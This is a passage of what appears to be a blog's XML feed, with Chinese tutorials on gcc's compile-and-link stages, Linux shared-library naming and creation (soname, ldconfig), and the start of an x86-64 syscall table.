class="meta-string">&quot;twoNumSum.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line"><span class="keyword">int</span> sum;</span><br><span class="line">x = y = <span class="number">10</span>;</span><br><span class="line">sum = AddTwoSum(x, y);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// twoNumSum.h</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifndef</span> TWO_NUM_SUM_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TWO_NUM_SUM_H</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">AddTwoNum</span><span class="params">(<span class="keyword">int</span> , <span class="keyword">int</span>)</span></span>; <span class="comment">// function declaration</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// twoNumSum.c</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;twoNumSum.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">AddTwoNum</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum;</span><br><span class="line">sum = x + y;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果直接在命令行中输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc mainFunc.c twoNumSum.c -o a.out</span></span><br></pre></td></tr></table></figure><p>则文件夹下会多出一个 a.out 文件，该文件就是经过 gcc 编译得到的在 Linux 上二进制可执行文件。事实上，该过程在背后其实执行了四个步骤，分别是预处理、编译、汇编和链接，<strong>而 gcc 命令也只是这些步骤对应的后台程序的包装</strong>。那么具体这四个阶段发生了什么呢，我们一一来看。</p><hr><h1 id="预处理（预编译）"><a href="#预处理（预编译）" class="headerlink" title="预处理（预编译）"></a>预处理（预编译）</h1><p>首先在预处理阶段，可以通过以下命令来让 gcc 调用预处理器（cpp），生成预处理后的 <code>.i</code>文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -E mainFunc.c -o mainFunc.i</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gcc -E twoNumSum.c -o twoNumSum.i</span> </span><br></pre></td></tr></table></figure><p>生成的 <code>.i</code> 文件如下图：<br><img src="2.png"></p><p>其实，<strong>预处理过程主要是处理源代码文件中的以 “#” 开始的预编译指令</strong>，主要处理规则如下：</p><ul><li>将所有的 “#define” 删除，并且展开所有的宏定义</li><li>处理所有条件预编译指令，比如 “#if”、”#ifdef”、“#ifndef”、“#else”、“#endif”等。</li><li>处理 “#include” 预编译指令，将被包含的文件插入到该预编译指令的位置。</li><li>删除所有的注释。</li><li>添加行号和文件名表示，以便编译时编译器产生调试信息。</li><li>保留所有的 “#program” 编译器指令，因为编译器要使用他们。</li></ul><hr><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>编译过程就是编译程序（ccl）把预处理完的文件经过一系列分析生成相应的 <code>.s</code> 汇编代码文件。对应命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -S mainFunc.i -o mainFunc.s</span><br><span class="line">gcc -S twoNumSum.i -o twoNumSum.s</span><br></pre></td></tr></table></figure><p>生成的 <code>.s</code> 文件如下图：<br><img src="3.png"></p><p>当然，编译过程的细枝末节也是一门大学问了！</p><hr><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>对于上述生成的 <code>.s</code> 文件中的汇编代码，机器自然是无法执行的，那汇编阶段就是汇编器（as）将上述的汇编代码汇编成机器可以执行的二进制代码，生成 <code>.o</code> 目标文件。汇编的过程是很简单的，没有复杂的语法，只需要根据汇编指令和机器指令的对照表一一翻译就可以了。对应命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -c mainFunc.s -o mainFunc.o</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gcc -c twoNumSum.s -o twoNumSum.o</span></span><br></pre></td></tr></table></figure><p>此时生成 <code>.o</code> 就不能用编辑器打开查看内容了，但是我们可以键入 ubuntu 下的 file 命令来看看该文件的基本属性：<br><img src="4.png"></p><p>发现生成的 <code>.o</code> 文件是 <strong>ELF 可重定位文件</strong>，ELF 其实就是 Linux 操作系统下的一种文件的格式，主要有可重定位文件，可执行文件和共享文件。</p><hr><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>回想刚刚的 main 函数，其中调用了 TwoNumSum 这个函数，哎不对，经过预处理后，明明 main 函数文件内也仅仅包括了 TwoNumSum 函数的声明，并没有它的实现，那 main 函数是怎么实现调用的呢，其实这里就是链接器（ld）发挥作用的时候了。 链接器就是负责把各个模块之间相互引用的部分处理好，使得各个模块之间可以正确地衔接，然后生成可执行二进制程序。对应命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc mainFunc.o twoNumSum.o -o a.out</span></span><br></pre></td></tr></table></figure><p>这样就生成了可执行文件 <code>a.out</code>，如果输入 <code>./a.out</code>会发现 shell 没有任何反馈，但是 <code>a.out</code> 一定是在机器内执行了哦，只是我们让他产生输入输出结果而已啦！况且，根据 Linux 哲学，没有反馈就是最好的反馈嘛。</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>可以看到，两个源代码文件 mainFunc.c 和 twoNumSum.c 从预处理到编译到汇编都是单独进行的，直到链接的时候才会拼接到了一起生成最终的可执行文件 <code>a.out</code></strong> 。到这里，应该对编译链接干了啥有个初步的了解了，编译链接本身是一个庞大的知识体系，如果对其有兴趣，可以查阅相关资料自行学习。</p>]]></content>
      
      
      <categories>
          
          <category> 底层原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链接 </tag>
            
            <tag> 编译 </tag>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>管理 Linux 系统中的带版本的共享库</title>
      <link href="/2021/10/18/linux-manage-shared-lib/"/>
      <url>/2021/10/18/linux-manage-shared-lib/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前自己在编译共享库的时候一直就把生成的共享库直接命名成 libxxx.so 的形式，最近遇到需要进行共享库版本管理的问题，发现之前对于 Linux 系统对共享库管理的方式的掌握成都已经不再够用了，所以接下来记录 Linux 系统中管理共享库的解决方法。</p><hr><h1 id="约定俗称的命名方式"><a href="#约定俗称的命名方式" class="headerlink" title="约定俗称的命名方式"></a>约定俗称的命名方式</h1><p>在 Linux 上对共享库的命名采用 <strong>libxxx.so.a.b.c</strong> 的格式，其中 a 代表主版本号，b 代表次版本号，c 代表发布版本号，其中发布版本号一般是可选的。而因此动态库就有了三种名字：</p><ul><li><font color=red><strong>linker name</strong></font>：顾名思义，这个名字是链接器链接共享库所用到的名字，其格式为 <strong>libxxx.so</strong> ，也就是说其不带任何版本号。在编译选项中通过 -lxxx 来指定依赖库，链接器就会去指定好的路径中搜索 libxxx.so，作为链接使用。</li><li><font color=red><strong>soname</strong></font>：soname 是一个<strong>很重要的名字</strong>，其格式为 <strong>libxxx.so.a</strong>，也就是在 linker name 后面加上主版本号，其具体作用我们后续再讨论。</li><li><font color=red><strong>real name</strong></font>：顾名思义，这就是共享库的真实名称，传统意义上来说，一个共享库的真实名称应该是 <strong>libxxx.so.a.b.c</strong> 的格式，但实际上并不一定。</li></ul><p>我们可以查看 Linux 中的一些库文件。比如说 c 语言的标准库：<br><img src="1.png"></p><p>可以发现其 soname 仅仅是一个<strong>软链接</strong>，指向真正的标准库文件 libc-2.31.so，这就是其 real name，而其 real name 也不是完全符合命名格式，所以说，<strong>real name 也可以不符合上述的命名方式</strong>。<br>再看看管道库：<br><img src="2.png"></p><p>可以发现这个共享库就满足了上述的命名格式。</p><hr><h1 id="查看可执行文件依赖的共享库"><a href="#查看可执行文件依赖的共享库" class="headerlink" title="查看可执行文件依赖的共享库"></a>查看可执行文件依赖的共享库</h1><p>通过 <code>ldd</code> 命令可以查看可执行文件依赖的共享库。<br><img src="3.png"></p><p>可以看到常用的 <code>ls</code> 命令依赖的共享库，且其名称都是用的 soname ！！！！ 这里埋下一个伏笔，<font color=red><strong>想想为什么用的都是 soname？</strong> </font> 等文章末尾再做出解答。</p><hr><h1 id="创建有版本号的共享库"><a href="#创建有版本号的共享库" class="headerlink" title="创建有版本号的共享库"></a>创建有版本号的共享库</h1><p>假设我们要将以下函数创建成共享库：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// shared.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">versionControl</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the version of shared is 0.0.1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// shared.h</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">versionCOntrol</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>通过一个用户程序来调用它：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;shared.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">versionControl();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用如下命令进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc shared.c -fPIC -shared -Wl,-soname,libshared.so.0 -o libshared.so.0.0.1</span><br></pre></td></tr></table></figure><p>可以看到生成了一个共享库 <strong>libshared.so.0.0.1</strong> 。<br><img src="4.png"></p><p>注意这条编译命令其中的参数 <code>-Wl,-soname,libshared.so.0</code>，这个命令就是告诉链接器，指定所生成的共享库的 soname。其中，<strong>soname 是直接被保存在共享库的二进制文件中的</strong>。可以查看如下：<br><img src="5.png"></p><p>这样，通过 <code>ldconfig</code> 命令则可以为刚刚编译出来的共享库生成一个软链接，这条软链接正是从 soname 指向 real name。<br><img src="6.png"></p><blockquote><p>[注] 在 Linux 中编译共享库的时候一般都会指定其 soname ，在编译好后用 <code>ldconfig</code> 命令为其生成软链接和刷新缓存文件 <strong>/etc/ld.so.cache</strong>（加上 -n 选项表示只处理当前指定的目录，而且不刷新缓存）。这个软链接的生成就是依赖已经保存到共享库中的 soname，而不仅仅是简单的截断共享库名。</p></blockquote><hr><h2 id="0x4-使用共享库"><a href="#0x4-使用共享库" class="headerlink" title="0x4 使用共享库"></a>0x4 使用共享库</h2><p>现在共享库被创建出来了，我们可以编译 main.c 来使用共享库。<br><img src="7.png"></p><p>发现报了链接错误，无法找到链接库。这是因为在链接的时候寻找的库的 <strong>linker name</strong>，也就是 libshared.so，这自然无法找到了。所以我们可以创建一个软链接，让 <strong>linker name</strong> 指向 <strong>soname</strong> ，再编译，就可以编译成功了，如下：<br><img src="8.png"></p><p>但此时还不能运行 main 程序，因为装载程序无法找到共享库。用 <code>ldd</code> 查看其依赖的共享库，发现 <strong>libshared.so.0</strong> 没有找到。<br><img src="9.png"></p><p>这是因为装载程序搜索的路径不包含当期的文件夹，因为前面用的 <code>ldconfig</code> 命令加上了 -n 选项，所以没有刷新缓存。这里只需要用 <code>ldconfig</code> 命令刷一下缓存，将当前的目录也配置到告诉缓存就行。<br><img src="10.png"></p><p>执行成功，mian 输出了我们的版本号为 <strong>0.0.1</strong>。而 main 所依赖的共享库用的都是 soname，这就说明了<strong>在编译的时候</strong>，编译器就将 soname 记录到了可执行文件中。</p><hr><h1 id="共享库的更新"><a href="#共享库的更新" class="headerlink" title="共享库的更新"></a>共享库的更新</h1><p>假设我们需要将库添加一个功能升级一个版本，但这个新版本是与之前版本兼容的，修改库里面的输出版本信息的函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">versionControl</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the version of shared is 0.0.2\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后重新编译共享库，因为仍然是兼容的，所以不改变 soname 的名称。并且用 <code>ldconfig</code> 命令更新 soname 到 real name 的软链接。<br><img src="11.png"></p><p>可以看到生成了一个新版的共享库 <strong>libshared.so.0.0.2</strong>，并且 soname 也指向了他，所以在不重新编译 main 目标的情况下，运行它发现输出了新版的版本信息，也就是用了新版的共享库！！</p><blockquote><p>假设我们对库有一次比较大的变更，导致新版本不再兼容了，这就需要修改 soname 了，由于可执行文件中保留的还是之前版本的 soname，所以原本的可执行文件是无法使用新版的共享库的，这时候就需要对可执行文件进行重新编译，链接到新版的共享库。</p></blockquote><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到目前为止，我们就大概明白了 Linux 系统下管理共享库的方向，可以总结出一些要点如下：</p><ul><li>首先就是 <strong>soname</strong>，这是很重要的名称！它就像一个桥梁，<strong>不仅仅在共享库中会指定它（在编译的时候加入编译选项），而且在使用共享库的可执行文件中也会指定它（在编译的时候编译器会顺着linker name 找到 real name，然后从共享库中取出 soname）</strong>，通过 <code>ldd</code> 命令查看可执行文件的依赖库，共享库显示的都是 soname 的名称。</li><li>正是因为 soname 的桥梁作用，使得共享库的小更新（不影响版本兼容性）不需要重新编译可执行文件，只需要在更新共享库后用 <code>ldconfig</code> 命令重新自动生成 soname 到 新版本 real name 的软链接，原来的可执行文件即可以自动加载新版的共享库。</li><li>如果共享库的版本发生重大更新，导致了不兼容性，则需要指定新的 soname，原来可执行文件想要用到新的共享库，也必须重新编译，这是因为原来编译的可执行文件中保存了旧的 soname 的索引，这个索引是装载程序为其装载共享库的依据。</li><li>在我们进行共享库升级管理的时候，如果更新不影响与之前版本的兼容性，就仅仅更新次版本号和发布版本号，用 <code>ldconfig</code> 命令重新生成软链接即可。而如果更新影响了兼容性，则需要更新主版本号，改变库的 soname ，同时其他用户程序要想用新版的共享库，也需要重新编译来链接新版的共享库才行。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 底层原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 共享库简介（怎样创建共享库）</title>
      <link href="/2021/10/18/linux-create-shared-lib/"/>
      <url>/2021/10/18/linux-create-shared-lib/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个库文件由多个不同的目标文件填充组成，众所周知，目标文件是由源代码经过编译得到的二进制中间文件，所以库文件中也是一系列已经编译好二进制代码，而它可能包含着在特定上下文中使用的一组函数。例如，当我们需要用到多线程中所提供的函数时， <code>pthread</code> 库就会被用到。</p><p>宽泛地讲，一个库（或者说程序库）有两种类型：</p><ul><li>1、共享库</li><li>2、静态库</li></ul><p>在这篇文章中我们将专门讨论共享库。</p><hr><h1 id="什么是共享库"><a href="#什么是共享库" class="headerlink" title="什么是共享库"></a>什么是共享库</h1><p>一句话讲，共享库就是可以<strong>在运行时</strong>链接到任何程序的库，它们提供了一种使用加载到内存中任意位置代码的方法。一旦共享库被加载到内存，它就可以被任意数量的程序来使用。通过这种方式，大量的代码以共享库的形式被其他程序共用，所以程序本身的大小和其占用的内存都会保持在很低的状态。</p><p>共享库为开发环境提供了模块化的特性，因为库代码在修改或者重新编译后，只要其提供的接口没变，使用该库的用户程序是不需要重新编译的。例如，在修改了 <strong>pthread</strong> 库中的代码之后，使用 <strong>pthread</strong> 共享库的代码是不需要做任何修改的。</p><p>在 Linux 系统中，一个共享库通过不同的名字来访问：</p><ul><li><strong>链接器名称</strong>：<strong>lib</strong> 后面接库的名字，再接 <strong>.so</strong> 。例如 <strong>libpthread.so</strong> 。</li><li><strong>完全限定的soname</strong>：<strong>lib</strong> 后接库的名字，再接 <strong>.so</strong>，再接 <strong>.</strong> 和一个主版本号。例如 <strong>libpthread.so.1</strong> 。</li><li><strong>真实名称</strong>： <strong>lib</strong> 后接库的名字，再接 <strong>.so</strong>，再接 <strong>.</strong> 和一个主版本号，再接一个 <strong>.</strong> 和次版本号，再接一个 <strong>.</strong> 和一个发布版本号，其中发布版本号是可选的。例如 <strong>libpthread.so.1.1</strong> 。</li></ul><p>当共享库中代码的修改使得与之前的版本不再兼容的时候，主版本号就应该跟着改变。例如，如果一个函数被完全移除了，则需要修改主版本号生成共享库一个新的版本。</p><p>当共享库中代码的修改使得与之前的版本还是兼容的，则只需要改变次版本号。例如，修复一个小 bug 是不会破坏当前共享库的兼容性的，所以只需要改变次版本号，而主版本号保持不变即可。</p><p><font color='red'><strong>现在你可能会好奇为什么一个共享库有这么多名称呢？</strong></font><br>！！！这种命名约定帮助同一个共享库的多个版本可以在系统中共存。链接共享库的程序不需要去考虑安装在系统中最新版本的库文件，一旦共享库的最新版本被成功安装到系统中，所有的程序都可以自动地链接到最新的版本。</p><hr><h1 id="共享库在文件系统中的位置"><a href="#共享库在文件系统中的位置" class="headerlink" title="共享库在文件系统中的位置"></a>共享库在文件系统中的位置</h1><p>在 Linux 文件系统中，主要有三个可以放置库的标准位置。</p><ul><li><strong>/lib</strong></li><li><strong>/usr/lib</strong></li><li><strong>/usr/local/lib</strong></li></ul><p>根据文件系统层次结构标准（FHS），所有在启动时加载并且在根文件系统中运行的库都被保存在 <strong>/lib</strong> 目录中；而系统内部使用的库存储在 <strong>/usr/lib</strong> 目录中，这些库并不是为了让用户或者 shell 脚本直接使用的；还有第三个位置 <strong>/usr/local/lib</strong> （尽管这个位置没有被定义在 FHS 的最新标准中），如果这个文件夹存在的话，那么它包含所有不属于标准发行版的库。这些非标准的库是你自己下载的库，而且它们是可能有 bug 的。</p><hr><h1 id="使用-ldconfig-命令"><a href="#使用-ldconfig-命令" class="headerlink" title="使用 ldconfig 命令"></a>使用 ldconfig 命令</h1><p>一旦一个共享库被创建出来，将其复制到相应的目录中（如 <strong>/usr/lib</strong> 或者 <strong>/usr/local/lib</strong> 中）。然后在对应的目录中运行 <strong><code>ldconfig</code></strong> 命令。那么 <code>ldconfig</code> 命令做了什么呢？</p><p>在之前有提到一个共享库有三种名称，链接器名称、完全限定的 soname 和真实名称。其中共享库的链接器名称是一个指向完全限定的 soname 的符号链接，而完全限定的 soname 是一个指向真实名称的符号链接。其实 ldconfig 正是干了这件事，创建符号链接。</p><p>当你运行一个 ELF 可执行文件的时候，默认情况下装载器是第一个被运行的，装载器本身也是一个共享目标文件 <strong>/lib/ld-linux.so.X</strong>，其中 <strong>.X</strong> 是一个版本号，这个装载器然后会找到并且装载所有我们程序所依赖的共享库文件。为了找到依赖库，所有装载器搜索的目录都保存在 <strong>/etc/ld.so.conf</strong> 中。搜索指定在 <strong>/etc/ld.so.conf</strong> 文件中的所有目录是非常耗时的，所以每次运行 <code>ldconfig</code> 命令，都会建立所需要的符号链接，然后在 <strong>/etc/ld.so.cache</strong> 文件中创建一个可执行文件所需要的所有信息的高速缓存，从缓存中读取信息可以大大减少时间消耗。但这里的问题是，每次添加或者删除共享库的时候都需要运行 <code>ldconfig</code> 命令，所以在程序启动的时候都会使用 <strong>/etc/ld.so.cache</strong> 去加载程序所依赖的库。</p><hr><h1 id="使用非标准库位置"><a href="#使用非标准库位置" class="headerlink" title="使用非标准库位置"></a>使用非标准库位置</h1><p>当使用非标准库位置（即不把你的动态库安装到）的时候，可以使用以下三种方法中的一个：</p><p>1、将路径加到文件 <strong>/etc/ld.so.conf</strong> 中，该文件包含装载器搜索依赖库的所有目录的路径。<br>有时候这个文件可能只包含单单一行如下：<br><img src="1.png"></p><p>在这种情况下，只需要创建一个配置文件在同样的目录下，然后运行 <code>ldconfig</code> 即可。</p><p>2、通过如下命令直接添加一个目录到高速缓存文件中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ldconfig [non standard directory path containing shared library]</span><br></pre></td></tr></table></figure><p>3、设置环境变量 <code>LD_LIBRARY_PATH</code>，以指向包含共享库的目录，装载器将使用此环境变量中提到的路径来解析依赖项。</p><hr><h1 id="示例（如何创建一个共享库）"><a href="#示例（如何创建一个共享库）" class="headerlink" title="示例（如何创建一个共享库）"></a>示例（如何创建一个共享库）</h1><p>接下来通过一个简单的示例来展示如何创建和使用共享库文件。下面是我们希望放在共享库中的代码（shared.c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;shared.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a, <span class="keyword">unsigned</span> <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n Inside add()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (a+b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shared.h 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a, <span class="keyword">unsigned</span> <span class="keyword">int</span> b)</span></span>;</span><br></pre></td></tr></table></figure><p>首先我们将 shared.c 编译打包成一个共享库文件。<br>1、运行以下两条命令来创建一个共享库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -Wall -Werror -fPIC shared.c</span><br><span class="line">gcc -shared -o libshared.so shared.o</span><br></pre></td></tr></table></figure><p>第一条编译命令将源代码编译成共享库需要得位置无关代码；第二条编译命令则真正的创建了共享库 <strong>libshared.so</strong>。</p><p>2、下面是使用共享库中 add 函数的用户代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;shared.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    result = add(a,b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n The result is [%u]\n&quot;</span>,result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、接下来运行如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -L./ -Wall main.c -o main -lshared</span><br></pre></td></tr></table></figure><p>这个编译命令编译 mian.c 中的代码并且告诉 gcc 去链接共享库 libshared.so 中的代码（通过使用编译选项 -l），而且告诉编译器共享库文件的位置（通过编译选项 -L）。</p><p>编译过后，可以看到当前文件夹下的文件如下：<br><img src="2.png"></p><p>4、如果直接运行可执行文件 main，则会报装载错误，如下：<br><img src="3.png"></p><p>无法找到共享库 <strong>libshared.so</strong> ！！！所以接下来我们需要根据第四点中提到的那样配置路径。</p><p>当然我们可以直接将共享库 <strong>libshared.so</strong> 复制到 /usr/lib 或者 /lib 中，就不需要配置路径运行 main 了。<br><img src="4.png"></p><p>然后我们也可以通过增加路径配置文件到 <strong>/etc/ld.so.conf.d</strong> 文件夹下，然后运行 <code>ldconfig</code>命令生成缓存来完成路径配置，操作步骤如下：<br><img src="5.png"></p><p>当然我们也可以通过直接用 ldconfig 命令指定路径来刷新缓存，操作步骤如下：<br><img src="6.png"></p><p>还可以通过修改环境变量来配置路径，但是这个是临时的，关闭 shell 重启则失效了，操作步骤如下：<br><img src="7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 底层原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 在 X86 64下的系统调用表</title>
      <link href="/2021/10/18/linux-system-call-x86-64/"/>
      <url>/2021/10/18/linux-system-call-x86-64/</url>
      
        <content type="html"><![CDATA[<p>Note: 64-bit x86 uses <strong>syscall</strong> instead of interrupt <strong>0x80</strong>. The result value will be in %rax.</p><p>To find the implementation of a system call, grep the kernel tree for <code>SYSCALL_DEFINE.\?(syscall,</code><br>For example, to find the read system call:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/usr/src/linux-source-3.19$ grep -rA3 &#x27;SYSCALL_DEFINE.\?(read,&#x27; *</span><br><span class="line">fs/read_write.c:SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)</span><br><span class="line">fs/read_write.c-&#123;</span><br><span class="line">fs/read_write.c-        struct file *file;</span><br><span class="line">fs/read_write.c-        ssize_t ret = -EBADF;</span><br></pre></td></tr></table></figure><p>Refer to the syscall numbers in <a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl">arch/x86/entry/syscalls/syscall_64.tbl</a> to determine if the table below is out of date.</p><table><thead><tr><th align="center">%rax</th><th align="center">System call</th><th align="center">%rdi</th><th align="center">%rsi</th><th align="center">%rdx</th><th align="center">%r10</th><th align="center">%r8</th><th align="center">%r9</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">sys_read</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">1</td><td align="center">sys_write</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">2</td><td align="center">sys_open</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">int mode</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">3</td><td align="center">sys_close</td><td align="center">unsigned int fd</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">4</td><td align="center">sys_stat</td><td align="center">const char *filename</td><td align="center">struct stat *statbuf</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">5</td><td align="center">sys_fstat</td><td align="center">unsigned int fd</td><td align="center">struct stat 